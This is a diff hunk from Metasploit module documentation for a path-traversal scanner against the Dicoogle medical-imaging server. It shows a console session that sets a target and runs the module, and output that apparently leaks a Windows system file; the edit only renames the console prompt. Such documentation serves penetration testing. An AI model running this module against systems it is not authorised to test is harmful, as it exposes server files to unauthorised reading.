@@ -19,12 +19,12 @@ successfully tested against Windows targets.
 ### Tested on Windows 2012 with Dicoogle 2.5.0 on Java 8 update 151
 
   ```
-  msf5 > use auxiliary/scanner/http/dicoogle_traversal 
-  msf5 auxiliary(scanner/http/dicoogle_traversal) > set rhosts 1.1.1.1
+  msf > use auxiliary/scanner/http/dicoogle_traversal 
+  msf auxiliary(scanner/http/dicoogle_traversal) > set rhosts 1.1.1.1
   rhosts => 1.1.1.1
-  msf5 auxiliary(scanner/http/dicoogle_traversal) > set verbose true
+  msf auxiliary(scanner/http/dicoogle_traversal) > set verbose true
   verbose => true
-  msf5 auxiliary(scanner/http/dicoogle_traversal) > run
+  msf auxiliary(scanner/http/dicoogle_traversal) > run
   
   [+] 192.168.2.164:8080 - ; for 16-bit app support
   [fonts]
